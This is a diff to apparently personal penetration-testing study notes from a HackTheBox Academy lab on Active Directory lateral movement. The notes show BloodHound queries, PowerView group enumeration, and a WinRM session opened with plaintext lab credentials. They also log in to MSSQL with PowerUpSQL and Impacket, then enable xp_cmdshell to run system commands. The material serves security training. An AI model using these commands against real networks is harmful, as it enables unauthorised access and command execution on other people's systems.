@@ -1555,4 +1555,144 @@ ObjectAceType         : DS-Replication-Get-Changes-All
     
 ## Moving laterally or vertically in AD
 ### Privileged Access
-- if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.
+- If we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.
+
+- There are several other ways we can move around a Windows domain:
+    - Remote Desktop Protocol (RDP)
+    - PowerShell Remoting
+    - MSSQL Server
+
+
+
+1. Remote Desktop
+```powershell
+# Enumerating the Remote Desktop Users Group
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+ComputerName : ACADEMY-EA-MS01
+GroupName    : Remote Desktop Users
+MemberName   : INLANEFREIGHT\Domain Users
+SID          : S-1-5-21-3842939050-3880317879-2865463114-513
+IsGroup      : True
+IsDomain     : UNKNOWN
+
+
+```
+
+- Using BloodHound:
+    - Check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.
+    - Pre-built queries in Analysis tab `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`
+
+
+2. WinRM
+```powershell
+# Enumerating the Remote Management Users Group
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+
+ComputerName : ACADEMY-EA-MS01
+GroupName    : Remote Management Users
+MemberName   : INLANEFREIGHT\forend
+SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
+IsGroup      : False
+IsDomain     : UNKNOWN
+```
+
+- Using BloodHound:
+    - Cypher query
+    ```cypher
+    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+    ```
+
+```powershell
+# Establishing WinRM Session from Windows
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
+ACADEMY-EA-MS01
+
+# From our Linux attack host, we can use the tool evil-winrm to connect.
+```
+
+3. SQL Server Admin
+- [Snaffler](#snaffler)
+- BloodHound:
+    - Check for `SQL Admin Rights` in the `Node Info` tab for a given user
+    - Cypher query: `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`
+
+- Authenticate to the SQL server using [PowerUpSQL cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
+
+```powershell
+# Enumerating MSSQL Instances with PowerUpSQL
+PS C:\htb> cd .\PowerUpSQL\
+PS C:\htb>  Import-Module .\PowerUpSQL.ps1
+PS C:\htb>  Get-SQLInstanceDomain
+
+ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
+Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
+DomainAccountSid : 1500000521000170152142291832437223174127203170152400
+DomainAccount    : damundsen
+DomainAccountCn  : Dana Amundsen
+Service          : MSSQLSvc
+Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
+LastLogon        : 4/6/2022 11:59 AM
+
+# Authenticate to the server & execute queries
+PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+VERBOSE: 172.16.5.150,1433 : Connection Success.
+
+Column1
+-------
+Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
+```
+- We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.
+```bash
+# Running mssqlclient.py Against the Target
+abdeonix@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+
+```
+- `enable_xp_cmdshell` to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database.
+```SQL
+# Choosing enable_xp_cmdshell
+SQL> enable_xp_cmdshell
+
+```
+
+- Now, run commands in the format `xp_cmdshell <command>`
+```SQL
+# Enumerating our Rights on the System using xp_cmdshell
+xp_cmdshell whoami /priv
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+NULL                                                                               
+
+PRIVILEGES INFORMATION                                                             
+
+----------------------                                                             
+
+NULL                                                                               
+
+Privilege Name                Description                               State      
+
+============================= ========================================= ========   
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+
+```
